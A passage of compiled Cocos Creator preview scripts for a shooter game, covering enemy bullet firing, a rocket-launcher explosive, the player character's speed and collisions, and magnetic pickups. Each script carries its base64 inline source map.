BQztJQUVELHlCQUFNLEdBQU47UUFDSSxJQUFJLENBQUMsUUFBUSxHQUFHLElBQUksQ0FBQyxZQUFZLENBQUMsRUFBRSxDQUFDLFFBQVEsQ0FBQyxDQUFDO0lBQ25ELENBQUM7SUFHRCwyQkFBUSxHQUFSO1FBQ0ksZUFBZTtRQUNmLElBQUksQ0FBQyxPQUFPLEdBQUcsS0FBSyxDQUFDO1FBQ3JCLElBQUksQ0FBQyxTQUFTLEdBQUcsS0FBSyxDQUFDO1FBQ3ZCLE1BQU0sQ0FBQyxzQkFBc0IsQ0FBQyxDQUFDLFNBQVMsQ0FBQyxJQUFJLENBQUMsSUFBSSxDQUFDLENBQUM7SUFDeEQsQ0FBQztJQUVELDRCQUFTLEdBQVQ7UUFDSSxJQUFJLENBQUMsSUFBSSxDQUFDLGNBQWMsRUFBRSxDQUFDO1FBQzNCLElBQUksb0JBQW9CLEdBQUcsTUFBTSxDQUFDLHNCQUFzQixDQUFDLENBQUM7UUFDMUQsb0JBQW9CLENBQUMsU0FBUyxDQUFDLE1BQU0sQ0FBQyxvQkFBb0IsQ0FBQyxTQUFTLENBQUMsT0FBTyxDQUFDLElBQUksQ0FBQyxFQUFFLENBQUMsQ0FBQyxDQUFDO0lBQzNGLENBQUM7SUFuRmdCLFFBQVE7UUFENUIsT0FBTztPQUNhLFFBQVEsQ0FvRjVCO0lBQUQsZUFBQztDQXBGRCxBQW9GQyxDQXBGcUMsRUFBRSxDQUFDLFNBQVMsR0FvRmpEO2tCQXBGb0IsUUFBUSIsImZpbGUiOiIiLCJzb3VyY2VSb290IjoiLyIsInNvdXJjZXNDb250ZW50IjpbIlxyXG5cclxuaW1wb3J0IHtHYW1lUHJveHl9IGZyb20gXCIuLi8uLi9nYW1lL0dhbWVQcm94eVwiO1xyXG5cclxuY29uc3Qge2NjY2xhc3MsIHByb3BlcnR5fSA9IGNjLl9kZWNvcmF0b3I7XHJcblxyXG5AY2NjbGFzc1xyXG5leHBvcnQgZGVmYXVsdCBjbGFzcyBQcm9wQmFzZSBleHRlbmRzIGNjLkNvbXBvbmVudCB7XHJcblxyXG4gICAgLy8gQHByb3BlcnR5XHJcbiAgICBjZCA9IDEyO1xyXG5cclxuICAgIGNvbGxpZGVyOmNjLkNvbGxpZGVyID0gbnVsbDtcclxuXHJcbiAgICAvKiog5piv5ZCm6Kem5Y+R5LqGICovXHJcbiAgICBwcm90ZWN0ZWQgX29uX29mZiA9IGZhbHNlO1xyXG5cclxuICAgIC8qKiDmmK/lkKbooqvno4Hpk4HlkLjlvJUgKi9cclxuICAgIHByaXZhdGUgX21hZ25ldGljID0gZmFsc2U7XHJcblxyXG4gICAgZ2V0IG9uX29mZigpOiBib29sZWFuIHtcclxuICAgICAgICByZXR1cm4gdGhpcy5fb25fb2ZmO1xyXG4gICAgfVxyXG5cclxuXHJcbiAgICBnZXQgbWFnbmV0aWMoKTogYm9vbGVhbiB7XHJcbiAgICAgICAgcmV0dXJuIHRoaXMuX21hZ25ldGljO1xyXG4gICAgfVxyXG5cclxuICAgIHNldCBtYWduZXRpYyh2YWx1ZTogYm9vbGVhbikge1xyXG4gICAgICAgIGlmICh2YWx1ZSAhPSB0aGlzLl9tYWduZXRpYyl7XHJcbiAgICAgICAgICAgIHRoaXMuX21hZ25ldGljID0gdmFsdWU7XHJcbiAgICAgICAgICAgIGlmICh0aGlzLl9tYWduZXRpYyl7XHJcbiAgICAgICAgICAgICAgICAvLyBjb25zb2xlLmxvZyhcIuejgeWKm+eUn+aViD09PT5cIik7XHJcbiAgICAgICAgICAgICAgICB0aGlzLm5vZGUuc3RvcEFsbEFjdGlvbnMoKTtcclxuICAgICAgICAgICAgICAgIC8qKiDmkp7lkJHop5LoibIgKi9cclxuICAgICAgICAgICAgICAgIHRoaXMubW92ZVRvUm9sZSgpO1xyXG4gICAgICAgICAgICB9XHJcbiAgICAgICAgfVxyXG4gICAgfVxyXG5cclxuICAgIHByaXZhdGUgbW92ZVRvUm9sZSgpe1xyXG4gICAgICAgIGxldCBnYW1lUm9sZUNvbnRyb2xsZXIgPSB3aW5kb3dbJ0dhbWVSb2xlQ29udHJvbGxlciddO1xyXG4gICAgICAgIGxldCBzcGVlZCA9IDEwMDA7XHJcbiAgICAgICAgbGV0IGRpc3RhbmNlID0gdGhpcy5ub2RlLnBvc2l0aW9uLnN1YihnYW1lUm9sZUNvbnRyb2xsZXIucm9sZS5ub2RlLnBvc2l0aW9uKS5tYWcoKTtcclxuICAgICAgICB0aGlzLm5vZGUucnVuQWN0aW9uKGNjLnNlcXVlbmNlKGNjLm1vdmVUbyhkaXN0YW5jZS9zcGVlZCwgZ2FtZVJvbGVDb250cm9sbGVyLnJvbGUubm9kZS5wb3NpdGlvbikuZWFzaW5nKGNjLmVhc2VTaW5lSW4oKSksIGNjLmNhbGxGdW5jKCgpPT57XHJcbiAgICAgICAgICAgIHRoaXMubW92ZVRvUm9sZSgpO1xyXG4gICAgICAgIH0pKSk7XHJcbiAgICB9XHJcblxyXG4gICAgcHJvcElEID0gLTE7XHJcblxyXG4gICAgaW5pdChpZDpudW1iZXIpe1xyXG4gICAgICAgIHRoaXMucHJvcElEID0gaWQ7XHJcbiAgICB9XHJcblxyXG4gICAgZGlzcGxheSgpe1xyXG4gICAgICAgIHRoaXMuX29uX29mZiA9IGZhbHNlO1xyXG4gICAgICAgIHRoaXMubm9kZS5hY3RpdmUgPSB0cnVlO1xyXG4gICAgICAgIC8v5YCS6K6h5pe2XHJcbiAgICAgICAgaWYgKHRoaXMuY2QgPiAwKXtcclxuICAgICAgICAgICAgdGhpcy5ub2RlLnJ1bkFjdGlvbihjYy5zZXF1ZW5jZShjYy5kZWxheVRpbWUodGhpcy5jZC01KSwgY2MuYmxpbmsoNSwgMjUpLCBjYy5jYWxsRnVuYygoKT0+e1xyXG4gICAgICAgICAgICAgICAgdGhpcy5ub2RlLmFjdGl2ZSA9IGZhbHNlO1xyXG4gICAgICAgICAgICB9KSkpO1xyXG4gICAgICAgIH1cclxuICAgIH1cclxuXHJcbiAgICB0cmlnZ2VyKCl7XHJcbiAgICAgICAgdGhpcy5fb25fb2ZmID0gdHJ1ZTtcclxuICAgICAgICB0aGlzLm5vZGUuc3RvcEFsbEFjdGlvbnMoKTtcclxuICAgICAgICBHYW1lUHJveHkuZW1pdChHYW1lUHJveHkuRXZlbnQuUHJvcFRyaWdnZXIsIHRoaXMpO1xyXG4gICAgICAgIHRoaXMubm9kZS5hY3RpdmUgPSBmYWxzZTtcclxuICAgIH1cclxuXHJcbiAgICBvbkxvYWQoKXtcclxuICAgICAgICB0aGlzLmNvbGxpZGVyID0gdGhpcy5nZXRDb21wb25lbnQoY2MuQ29sbGlkZXIpO1xyXG4gICAgfVxyXG5cclxuXHJcbiAgICBvbkVuYWJsZSgpe1xyXG4gICAgICAgIC8qKiDmo4DmtYvkuI7op5LoibLnmoTnorDmkp4gKi9cclxuICAgICAgICB0aGlzLl9vbl9vZmYgPSBmYWxzZTtcclxuICAgICAgICB0aGlzLl9tYWduZXRpYyA9IGZhbHNlO1xyXG4gICAgICAgIHdpbmRvd1snR2FtZUVuZW15c0NvbnRyb2xsZXInXS5nYW1lUHJvcHMucHVzaCh0aGlzKTtcclxuICAgIH1cclxuXHJcbiAgICBvbkRpc2FibGUoKXtcclxuICAgICAgICB0aGlzLm5vZGUuc3RvcEFsbEFjdGlvbnMoKTtcclxuICAgICAgICBsZXQgZ2FtZUVuZW15c0NvbnRyb2xsZXIgPSB3aW5kb3dbJ0dhbWVFbmVteXNDb250cm9sbGVyJ107XHJcbiAgICAgICAgZ2FtZUVuZW15c0NvbnRyb2xsZXIuZ2FtZVByb3BzLnNwbGljZShnYW1lRW5lbXlzQ29udHJvbGxlci5nYW1lUHJvcHMuaW5kZXhPZih0aGlzKSwgMSk7XHJcbiAgICB9XHJcbn1cclxuIl19
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/script/app/entities/enemy/EmitBulletEnemy.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, '5d8e2MjyvlLOoCyuh6N0alo', 'EmitBulletEnemy');
// script/app/entities/enemy/EmitBulletEnemy.ts

Object.defineProperty(exports, "__esModule", { value: true });
var Music_1 = require("../../../../framework/audio/Music");
var Enemy_1 = require("./Enemy");
var ccclass = cc._decorator.ccclass;
var EmitBulletEnemy = /** @class */ (function (_super) {
    __extends(EmitBulletEnemy, _super);
    function EmitBulletEnemy() {
        return _super !== null && _super.apply(this, arguments) || this;
    }
    EmitBulletEnemy.prototype.doAttack = function () {
        Music_1.Music.playSFX("sound/msc_en001");
        var bullet = window['GameBulletsController'].getInactiveEnemyBullet(this._enemyID);
        bullet.node.active = true;
        bullet.node.position = this.node.position;
        bullet.node.rotation = this.node.rotation;
        var dir = cc.v2(0, 1).rotate(cc.misc.degreesToRadians(-bullet.node.rotation)).normalizeSelf();
        bullet.node.runAction(cc.sequence(cc.moveBy(this.attackDistance / this.bulletSpeed, dir.mul(this.attackDistance)), cc.callFunc(function () {
            bullet.node.active = false;
        })));
    };
    EmitBulletEnemy = __decorate([
        ccclass
    ], EmitBulletEnemy);
    return EmitBulletEnemy;
}(Enemy_1.default));
exports.default = EmitBulletEnemy;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9zY3JpcHQvYXBwL2VudGl0aWVzL2VuZW15L0VtaXRCdWxsZXRFbmVteS50cyJdLCJuYW1lcyI6W10sIm1hcHBpbmdzIjoiOzs7Ozs7Ozs7Ozs7Ozs7O0FBQ0EsMkRBQXdEO0FBQ3hELGlDQUE0QjtBQUVyQixJQUFBLE9BQU8sR0FBSSxFQUFFLENBQUMsVUFBVSxRQUFqQixDQUFrQjtBQUdoQztJQUE2QyxtQ0FBSztJQUFsRDs7SUFhQSxDQUFDO0lBWGEsa0NBQVEsR0FBbEI7UUFDSSxhQUFLLENBQUMsT0FBTyxDQUFDLGlCQUFpQixDQUFDLENBQUM7UUFDakMsSUFBSSxNQUFNLEdBQUcsTUFBTSxDQUFDLHVCQUF1QixDQUFDLENBQUMsc0JBQXNCLENBQUMsSUFBSSxDQUFDLFFBQVEsQ0FBQyxDQUFDO1FBQ25GLE1BQU0sQ0FBQyxJQUFJLENBQUMsTUFBTSxHQUFHLElBQUksQ0FBQztRQUMxQixNQUFNLENBQUMsSUFBSSxDQUFDLFFBQVEsR0FBRyxJQUFJLENBQUMsSUFBSSxDQUFDLFFBQVEsQ0FBQztRQUMxQyxNQUFNLENBQUMsSUFBSSxDQUFDLFFBQVEsR0FBRyxJQUFJLENBQUMsSUFBSSxDQUFDLFFBQVEsQ0FBQztRQUMxQyxJQUFJLEdBQUcsR0FBRyxFQUFFLENBQUMsRUFBRSxDQUFDLENBQUMsRUFBRSxDQUFDLENBQUMsQ0FBQyxNQUFNLENBQUMsRUFBRSxDQUFDLElBQUksQ0FBQyxnQkFBZ0IsQ0FBQyxDQUFDLE1BQU0sQ0FBQyxJQUFJLENBQUMsUUFBUSxDQUFDLENBQUMsQ0FBQyxhQUFhLEVBQUUsQ0FBQztRQUM5RixNQUFNLENBQUMsSUFBSSxDQUFDLFNBQVMsQ0FBQyxFQUFFLENBQUMsUUFBUSxDQUFDLEVBQUUsQ0FBQyxNQUFNLENBQUMsSUFBSSxDQUFDLGNBQWMsR0FBQyxJQUFJLENBQUMsV0FBVyxFQUFFLEdBQUcsQ0FBQyxHQUFHLENBQUMsSUFBSSxDQUFDLGNBQWMsQ0FBQyxDQUFDLEVBQUUsRUFBRSxDQUFDLFFBQVEsQ0FBQztZQUN6SCxNQUFNLENBQUMsSUFBSSxDQUFDLE1BQU0sR0FBRyxLQUFLLENBQUM7UUFDL0IsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDO0lBQ1QsQ0FBQztJQVpnQixlQUFlO1FBRG5DLE9BQU87T0FDYSxlQUFlLENBYW5DO0lBQUQsc0JBQUM7Q0FiRCxBQWFDLENBYjRDLGVBQUssR0FhakQ7a0JBYm9CLGVBQWUiLCJmaWxlIjoiIiwic291cmNlUm9vdCI6Ii8iLCJzb3VyY2VzQ29udGVudCI6WyJcclxuaW1wb3J0IHtNdXNpY30gZnJvbSBcIi4uLy4uLy4uLy4uL2ZyYW1ld29yay9hdWRpby9NdXNpY1wiO1xyXG5pbXBvcnQgRW5lbXkgZnJvbSBcIi4vRW5lbXlcIjtcclxuXHJcbmNvbnN0IHtjY2NsYXNzfSA9IGNjLl9kZWNvcmF0b3I7XHJcblxyXG5AY2NjbGFzc1xyXG5leHBvcnQgZGVmYXVsdCBjbGFzcyBFbWl0QnVsbGV0RW5lbXkgZXh0ZW5kcyBFbmVteSB7XHJcblxyXG4gICAgcHJvdGVjdGVkIGRvQXR0YWNrKCk6IHZvaWQge1xyXG4gICAgICAgIE11c2ljLnBsYXlTRlgoXCJzb3VuZC9tc2NfZW4wMDFcIik7XHJcbiAgICAgICAgbGV0IGJ1bGxldCA9IHdpbmRvd1snR2FtZUJ1bGxldHNDb250cm9sbGVyJ10uZ2V0SW5hY3RpdmVFbmVteUJ1bGxldCh0aGlzLl9lbmVteUlEKTtcclxuICAgICAgICBidWxsZXQubm9kZS5hY3RpdmUgPSB0cnVlO1xyXG4gICAgICAgIGJ1bGxldC5ub2RlLnBvc2l0aW9uID0gdGhpcy5ub2RlLnBvc2l0aW9uO1xyXG4gICAgICAgIGJ1bGxldC5ub2RlLnJvdGF0aW9uID0gdGhpcy5ub2RlLnJvdGF0aW9uO1xyXG4gICAgICAgIGxldCBkaXIgPSBjYy52MigwLCAxKS5yb3RhdGUoY2MubWlzYy5kZWdyZWVzVG9SYWRpYW5zKC1idWxsZXQubm9kZS5yb3RhdGlvbikpLm5vcm1hbGl6ZVNlbGYoKTtcclxuICAgICAgICBidWxsZXQubm9kZS5ydW5BY3Rpb24oY2Muc2VxdWVuY2UoY2MubW92ZUJ5KHRoaXMuYXR0YWNrRGlzdGFuY2UvdGhpcy5idWxsZXRTcGVlZCwgZGlyLm11bCh0aGlzLmF0dGFja0Rpc3RhbmNlKSksIGNjLmNhbGxGdW5jKCgpPT57XHJcbiAgICAgICAgICAgIGJ1bGxldC5ub2RlLmFjdGl2ZSA9IGZhbHNlO1xyXG4gICAgICAgIH0pKSk7XHJcbiAgICB9XHJcbn1cclxuIl19
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/script/app/entities/explosive/ExplosiveHuoJianTong.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, '2707dq5zzBBO4ixkxdjzf4B', 'ExplosiveHuoJianTong');
// script/app/entities/explosive/ExplosiveHuoJianTong.ts

Object.defineProperty(exports, "__esModule", { value: true });
var Explosive_1 = require("./Explosive");
var GameProxy_1 = require("../../game/GameProxy");
var _a = cc._decorator, ccclass = _a.ccclass, property = _a.property;
var ExplosiveHuoJianTong = /** @class */ (function (_super) {
    __extends(ExplosiveHuoJianTong, _super);
    function ExplosiveHuoJianTong() {
        var _this = _super !== null && _super.apply(this, arguments) || this;
        _this._huojiantongSke = null;
        return _this;
    }
    ExplosiveHuoJianTong.prototype.init = function (id) {
        var _this = this;
        _super.prototype.init.call(this, id);
        this.bThrought = true;
        // this.hurt = 1;
        this._huojiantongSke = this.node.getComponent(sp.Skeleton);
        this._huojiantongSke.setCompleteListener(function (trackEntry, loopCount) {
            _this.node.active = false;
            /*let name = trackEntry.animation ? trackEntry.animation.name : '';
            if (name == "perfect01" || name == "perfect02" || name == "great01" || name == "great02") {
            }*/
        });
    };
    ExplosiveHuoJianTong.prototype.boom = function () {
        this._huojiantongSke.setAnimation(0, "biubiu_009b", false);
        GameProxy_1.GameProxy.emit(GameProxy_1.GameProxy.Event.ShakeScreen, 0.08, 2, 2);
    };
    ExplosiveHuoJianTong.prototype.doRepeal = function (enemy, repel) {
        enemy.doRepel(enemy.node.position.sub(this.node.position).normalize(), repel);
    };
    ExplosiveHuoJianTong = __decorate([
        ccclass
    ], ExplosiveHuoJianTong);
    return ExplosiveHuoJianTong;
}(Explosive_1.default));
exports.default = ExplosiveHuoJianTong;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9zY3JpcHQvYXBwL2VudGl0aWVzL2V4cGxvc2l2ZS9FeHBsb3NpdmVIdW9KaWFuVG9uZy50cyJdLCJuYW1lcyI6W10sIm1hcHBpbmdzIjoiOzs7Ozs7Ozs7Ozs7Ozs7O0FBQ0EseUNBQW9DO0FBQ3BDLGtEQUErQztBQUV6QyxJQUFBLEtBQXNCLEVBQUUsQ0FBQyxVQUFVLEVBQWxDLE9BQU8sYUFBQSxFQUFFLFFBQVEsY0FBaUIsQ0FBQztBQUcxQztJQUFrRCx3Q0FBUztJQUEzRDtRQUFBLHFFQTRCQztRQTFCVyxxQkFBZSxHQUFlLElBQUksQ0FBQzs7SUEwQi9DLENBQUM7SUF0QkcsbUNBQUksR0FBSixVQUFLLEVBQVU7UUFBZixpQkFXQztRQVZHLGlCQUFNLElBQUksWUFBQyxFQUFFLENBQUMsQ0FBQztRQUNmLElBQUksQ0FBQyxTQUFTLEdBQUcsSUFBSSxDQUFDO1FBQ3RCLGlCQUFpQjtRQUNqQixJQUFJLENBQUMsZUFBZSxHQUFHLElBQUksQ0FBQyxJQUFJLENBQUMsWUFBWSxDQUFDLEVBQUUsQ0FBQyxRQUFRLENBQUMsQ0FBQztRQUMzRCxJQUFJLENBQUMsZUFBZSxDQUFDLG1CQUFtQixDQUFDLFVBQUMsVUFBVSxFQUFFLFNBQVM7WUFDM0QsS0FBSSxDQUFDLElBQUksQ0FBQyxNQUFNLEdBQUcsS0FBSyxDQUFDO1lBQ3pCOztlQUVHO1FBQ1AsQ0FBQyxDQUFDLENBQUM7SUFDUCxDQUFDO0lBRUQsbUNBQUksR0FBSjtRQUNJLElBQUksQ0FBQyxlQUFlLENBQUMsWUFBWSxDQUFDLENBQUMsRUFBRSxhQUFhLEVBQUUsS0FBSyxDQUFDLENBQUM7UUFDM0QscUJBQVMsQ0FBQyxJQUFJLENBQUMscUJBQVMsQ0FBQyxLQUFLLENBQUMsV0FBVyxFQUFFLElBQUksRUFBRSxDQUFDLEVBQUUsQ0FBQyxDQUFDLENBQUM7SUFDNUQsQ0FBQztJQUVELHVDQUFRLEdBQVIsVUFBUyxLQUFLLEVBQUUsS0FBSztRQUNqQixLQUFLLENBQUMsT0FBTyxDQUFDLEtBQUssQ0FBQyxJQUFJLENBQUMsUUFBUSxDQUFDLEdBQUcsQ0FBQyxJQUFJLENBQUMsSUFBSSxDQUFDLFFBQVEsQ0FBQyxDQUFDLFNBQVMsRUFBRSxFQUFFLEtBQUssQ0FBQyxDQUFDO0lBQ2xGLENBQUM7SUExQmdCLG9CQUFvQjtRQUR4QyxPQUFPO09BQ2Esb0JBQW9CLENBNEJ4QztJQUFELDJCQUFDO0NBNUJELEFBNEJDLENBNUJpRCxtQkFBUyxHQTRCMUQ7a0JBNUJvQixvQkFBb0IiLCJmaWxlIjoiIiwic291cmNlUm9vdCI6Ii8iLCJzb3VyY2VzQ29udGVudCI6WyJcclxuaW1wb3J0IEV4cGxvc2l2ZSBmcm9tIFwiLi9FeHBsb3NpdmVcIjtcclxuaW1wb3J0IHtHYW1lUHJveHl9IGZyb20gXCIuLi8uLi9nYW1lL0dhbWVQcm94eVwiO1xyXG5cclxuY29uc3Qge2NjY2xhc3MsIHByb3BlcnR5fSA9IGNjLl9kZWNvcmF0b3I7XHJcblxyXG5AY2NjbGFzc1xyXG5leHBvcnQgZGVmYXVsdCBjbGFzcyBFeHBsb3NpdmVIdW9KaWFuVG9uZyBleHRlbmRzIEV4cGxvc2l2ZSB7XHJcblxyXG4gICAgcHJpdmF0ZSBfaHVvamlhbnRvbmdTa2U6c3AuU2tlbGV0b24gPSBudWxsO1xyXG5cclxuXHJcblxyXG4gICAgaW5pdChpZDogbnVtYmVyKSB7XHJcbiAgICAgICAgc3VwZXIuaW5pdChpZCk7XHJcbiAgICAgICAgdGhpcy5iVGhyb3VnaHQgPSB0cnVlO1xyXG4gICAgICAgIC8vIHRoaXMuaHVydCA9IDE7XHJcbiAgICAgICAgdGhpcy5faHVvamlhbnRvbmdTa2UgPSB0aGlzLm5vZGUuZ2V0Q29tcG9uZW50KHNwLlNrZWxldG9uKTtcclxuICAgICAgICB0aGlzLl9odW9qaWFudG9uZ1NrZS5zZXRDb21wbGV0ZUxpc3RlbmVyKCh0cmFja0VudHJ5LCBsb29wQ291bnQpID0+IHtcclxuICAgICAgICAgICAgdGhpcy5ub2RlLmFjdGl2ZSA9IGZhbHNlO1xyXG4gICAgICAgICAgICAvKmxldCBuYW1lID0gdHJhY2tFbnRyeS5hbmltYXRpb24gPyB0cmFja0VudHJ5LmFuaW1hdGlvbi5uYW1lIDogJyc7XHJcbiAgICAgICAgICAgIGlmIChuYW1lID09IFwicGVyZmVjdDAxXCIgfHwgbmFtZSA9PSBcInBlcmZlY3QwMlwiIHx8IG5hbWUgPT0gXCJncmVhdDAxXCIgfHwgbmFtZSA9PSBcImdyZWF0MDJcIikge1xyXG4gICAgICAgICAgICB9Ki9cclxuICAgICAgICB9KTtcclxuICAgIH1cclxuXHJcbiAgICBib29tKCkge1xyXG4gICAgICAgIHRoaXMuX2h1b2ppYW50b25nU2tlLnNldEFuaW1hdGlvbigwLCBcImJpdWJpdV8wMDliXCIsIGZhbHNlKTtcclxuICAgICAgICBHYW1lUHJveHkuZW1pdChHYW1lUHJveHkuRXZlbnQuU2hha2VTY3JlZW4sIDAuMDgsIDIsIDIpO1xyXG4gICAgfVxyXG5cclxuICAgIGRvUmVwZWFsKGVuZW15LCByZXBlbCk6IHZvaWQge1xyXG4gICAgICAgIGVuZW15LmRvUmVwZWwoZW5lbXkubm9kZS5wb3NpdGlvbi5zdWIodGhpcy5ub2RlLnBvc2l0aW9uKS5ub3JtYWxpemUoKSwgcmVwZWwpO1xyXG4gICAgfVxyXG5cclxufVxyXG4iXX0=
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/script/app/entities/role/Role.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, 'a7126UmhvpEn48Odvb547b7', 'Role');
// script/app/entities/role/Role.ts

Object.defineProperty(exports, "__esModule", { value: true });
exports.SpeedType = void 0;
var RoleAABB_1 = require("./RoleAABB");
var RoleSupply_1 = require("./RoleSupply");
var _a = cc._decorator, ccclass = _a.ccclass, property = _a.property;
var SpeedType;
(function (SpeedType) {
    SpeedType[SpeedType["STOP"] = 0] = "STOP";
    SpeedType[SpeedType["NORMAL"] = 1] = "NORMAL";
    SpeedType[SpeedType["FAST"] = 2] = "FAST";
})(SpeedType = exports.SpeedType || (exports.SpeedType = {}));
var Role = /** @class */ (function (_super) {
    __extends(Role, _super);
    function Role() {
        var _this = _super !== null && _super.apply(this, arguments) || this;
        _this.fireSprite = null;
        _this.gunTopNode = null;
        _this.spriteNode = null;
        _this._speedType = SpeedType.STOP;
        _this._speed = 0;
        _this._roleAABB = null;
        _this._spaceCircleCollider = null;
        _this.stopSpeed = 0;
        _this.normalSpeed = 100;
        _this.fastSpeed = 200;
        _this.accSpeed = 1;
        return _this;
    }
    Object.defineProperty(Role.prototype, "spaceCircleCollider", {
        get: function () {
            return this._spaceCircleCollider;
        },
        enumerable: false,
        configurable: true
    });
    Object.defineProperty(Role.prototype, "roleAABB", {
        get: function () {
            return this._roleAABB;
        },
        enumerable: false,
        configurable: true
    });
    Object.defineProperty(Role.prototype, "speed", {
        get: function () {
            return this._speed * this.accSpeed;
        },
        enumerable: false,
        configurable: true
    });
    Object.defineProperty(Role.prototype, "speedType", {
        get: function () {
            return this._speedType;
        },
        set: function (value) {
            switch (value) {
                case SpeedType.STOP:
                    this._speed = this.stopSpeed;
                    break;
                case SpeedType.NORMAL:
                    this._speed = this.normalSpeed;
                    break;
                case SpeedType.FAST:
                    this._speed = this.fastSpeed;
                    break;
            }
            this._speedType = value;
        },
        enumerable: false,
        configurable: true
    });
    Role.prototype.onLoad = function () {
        this._roleAABB = this.getComponent(RoleAABB_1.default);
        this._spaceCircleCollider = this.getComponent(cc.CircleCollider);
    };
    /** 碰撞处理 */
    Role.prototype.onCollisionEnter = function (other, self) {
        /** 如果是怪物 */
        if (other.tag == 1) {
            console.log("角色被攻击了.");
        }
    };
    Role.prototype.addSupply = function (id) {
        var prefab = cc.loader.getRes('prefab/roleSupply', cc.Prefab);
        var node = cc.instantiate(prefab);
        node.getComponent(RoleSupply_1.default).setSupply(id, this.node);
        this.node.getParent().addChild(node);
    };
    __decorate([
        property(cc.Sprite)
    ], Role.prototype, "fireSprite", void 0);
    __decorate([
        property(cc.Node)
    ], Role.prototype, "gunTopNode", void 0);
    __decorate([
        property(cc.Node)
    ], Role.prototype, "spriteNode", void 0);
    __decorate([
        property({ type: cc.Enum(SpeedType), tooltip: "速度级别" })
    ], Role.prototype, "speedType", null);
    __decorate([
        property({ tooltip: "停止时速度" })
    ], Role.prototype, "stopSpeed", void 0);
    __decorate([
        property({ tooltip: "正常速度" })
    ], Role.prototype, "normalSpeed", void 0);
    __decorate([
        property({ tooltip: "最快速度" })
    ], Role.prototype, "fastSpeed", void 0);
    __decorate([
        property
    ], Role.prototype, "accSpeed", void 0);
    Role = __decorate([
        ccclass
    ], Role);
    return Role;
}(cc.Component));
exports.default = Role;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9zY3JpcHQvYXBwL2VudGl0aWVzL3JvbGUvUm9sZS50cyJdLCJuYW1lcyI6W10sIm1hcHBpbmdzIjoiOzs7Ozs7Ozs7Ozs7Ozs7OztBQUVBLHVDQUFrQztBQUVsQywyQ0FBc0M7QUFFaEMsSUFBQSxLQUFzQixFQUFFLENBQUMsVUFBVSxFQUFsQyxPQUFPLGFBQUEsRUFBRSxRQUFRLGNBQWlCLENBQUM7QUFFMUMsSUFBWSxTQUlYO0FBSkQsV0FBWSxTQUFTO0lBQ2pCLHlDQUFJLENBQUE7SUFDSiw2Q0FBTSxDQUFBO0lBQ04seUNBQUksQ0FBQTtBQUNSLENBQUMsRUFKVyxTQUFTLEdBQVQsaUJBQVMsS0FBVCxpQkFBUyxRQUlwQjtBQUlEO0lBQWtDLHdCQUFZO0lBQTlDO1FBQUEscUVBb0ZDO1FBakZHLGdCQUFVLEdBQWEsSUFBSSxDQUFDO1FBRzVCLGdCQUFVLEdBQVcsSUFBSSxDQUFDO1FBRzFCLGdCQUFVLEdBQVcsSUFBSSxDQUFDO1FBRWxCLGdCQUFVLEdBQWEsU0FBUyxDQUFDLElBQUksQ0FBQztRQUN0QyxZQUFNLEdBQUcsQ0FBQyxDQUFDO1FBRVgsZUFBUyxHQUFZLElBQUksQ0FBQztRQUUxQiwwQkFBb0IsR0FBcUIsSUFBSSxDQUFDO1FBb0N0RCxlQUFTLEdBQUcsQ0FBQyxDQUFDO1FBR2QsaUJBQVcsR0FBRyxHQUFHLENBQUM7UUFHbEIsZUFBUyxHQUFHLEdBQUcsQ0FBQztRQUdoQixjQUFRLEdBQUcsQ0FBQyxDQUFDOztJQXVCakIsQ0FBQztJQWpFRyxzQkFBSSxxQ0FBbUI7YUFBdkI7WUFDSSxPQUFPLElBQUksQ0FBQyxvQkFBb0IsQ0FBQztRQUNyQyxDQUFDOzs7T0FBQTtJQUVELHNCQUFJLDBCQUFRO2FBQVo7WUFDSSxPQUFPLElBQUksQ0FBQyxTQUFTLENBQUM7UUFDMUIsQ0FBQzs7O09BQUE7SUFFRCxzQkFBSSx1QkFBSzthQUFUO1lBQ0ksT0FBTyxJQUFJLENBQUMsTUFBTSxHQUFDLElBQUksQ0FBQyxRQUFRLENBQUM7UUFDckMsQ0FBQzs7O09BQUE7SUFHRCxzQkFBSSwyQkFBUzthQUFiO1lBQ0ksT0FBTyxJQUFJLENBQUMsVUFBVSxDQUF